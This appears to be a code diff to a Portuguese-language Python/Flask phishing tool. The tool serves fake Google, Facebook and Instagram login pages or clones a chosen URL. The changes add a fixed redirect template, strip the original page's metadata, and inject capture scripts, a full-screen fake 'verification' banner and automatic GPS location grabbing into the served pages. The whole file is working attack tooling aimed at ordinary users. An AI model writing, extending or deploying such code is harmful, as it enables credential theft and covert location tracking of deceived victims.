@@ -19,10 +19,16 @@ if not os.path.exists(pasta_templates): os.makedirs(pasta_templates)
 if not os.path.exists(pasta_preview): os.makedirs(pasta_preview)
 
 def obter_temas():
-    temas = {"1": "google", "2": "facebook", "3": "facebook_pc", "4": "instagram"}
+    temas = {
+        "1": "google", 
+        "2": "facebook", 
+        "3": "facebook_pc", 
+        "4": "instagram",
+        "6": "redirecionar"   # ← Novo template fixo
+    }
     if os.path.exists(pasta_templates):
         extras = [d for d in os.listdir(pasta_templates) if os.path.isdir(os.path.join(pasta_templates, d))]
-        idx = 6
+        idx = 7  # Começa do 7 agora, pois 6 está reservado
         for pasta in extras:
             if pasta not in temas.values():
                 temas[str(idx)] = pasta
@@ -39,8 +45,9 @@ def mostrar_menu():
     for i in range(1, 5):
         print(f" [{i}] {temas_disponiveis[str(i)].capitalize()} Login")
     print(" [5] Custom (URL - Clonar agora)")
+    print(f" [6] {temas_disponiveis['6'].capitalize()}")  # Opção 6 fixa
     for k, v in temas_disponiveis.items():
-        if int(k) >= 6:
+        if int(k) >= 7:
             print(f" [{k}] {v} (Salvo)")
     print("="*40)
 
@@ -48,7 +55,7 @@ def mostrar_menu():
     
     ativar_loc = input(" Ativar localização? (s/n): ").lower() == 's'
     ativar_foto = input(" Ativar foto? (s/n): ").lower() == 's'
-    ativar_banner = input(" Ativar banner de verificação? (s/n): ").lower() == 's'   # Nova opção
+    ativar_banner = input(" Ativar banner de verificação? (s/n): ").lower() == 's'
     
     url_custom = ""
     if opcao == "5":
@@ -115,7 +122,7 @@ def index():
     except Exception as e:
         return f"Erro: {e}", 500
 
-    # --- LIMPEZA DE METADADOS ANTIGOS (Para funcionar no clone) ---
+    # --- LIMPEZA DE METADADOS ANTIGOS ---
     if personalizar == 's':
         html_original = re.sub(r'<title>.*?</title>', '', html_original, flags=re.IGNORECASE)
         html_original = re.sub(r'<meta property="og:.*?>', '', html_original, flags=re.IGNORECASE)
@@ -133,7 +140,7 @@ def index():
             f'<meta name="description" content="{meta_desc}">\n'
         )
 
-    # ==================== BANNER E GPS (CORRIGIDO) ====================
+    # ==================== BANNER E GPS ====================
     css_banner = '''
     <style>
         #bloqueio-spy { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; 
@@ -164,14 +171,13 @@ def index():
             if(typeof dispararGPS === "function") dispararGPS();
         }}
 
-        // === GPS AUTOMÁTICO QUANDO BANNER ESTIVER DESATIVADO ===
         if (!{"true" if ativar_banner else "false"}) {{
             window.addEventListener('load', function() {{
                 setTimeout(function() {{
                     if (typeof dispararGPS === "function" && window.usarLoc === true) {{
                         dispararGPS();
                     }}
-                }}, 1200);   // Delay para garantir compatibilidade com navegadores
+                }}, 1200);
             }});
         }}
     </script>'''
@@ -180,20 +186,17 @@ def index():
 
     head_content = meta_tags + script_config + scripts_captura
 
-    # Adiciona CSS do banner apenas se estiver ativado
     if ativar_banner:
         head_content = css_banner + head_content
         banner_html = html_banner
     else:
         banner_html = ""
 
-    # Injeta conteúdo no <head>
     if re.search(r'<head', html_original, re.IGNORECASE):
         html_final = re.sub(r'(<head[^>]*>)', r'\1' + head_content, html_original, flags=re.IGNORECASE, count=1)
     else:
         html_final = head_content + html_original
 
-    # Injeta o banner no <body> apenas se ativado
     if ativar_banner:
         if re.search(r'<body', html_final, re.IGNORECASE):
             html_final = re.sub(r'(<body[^>]*>)', r'\1' + banner_html, html_final, flags=re.IGNORECASE, count=1)
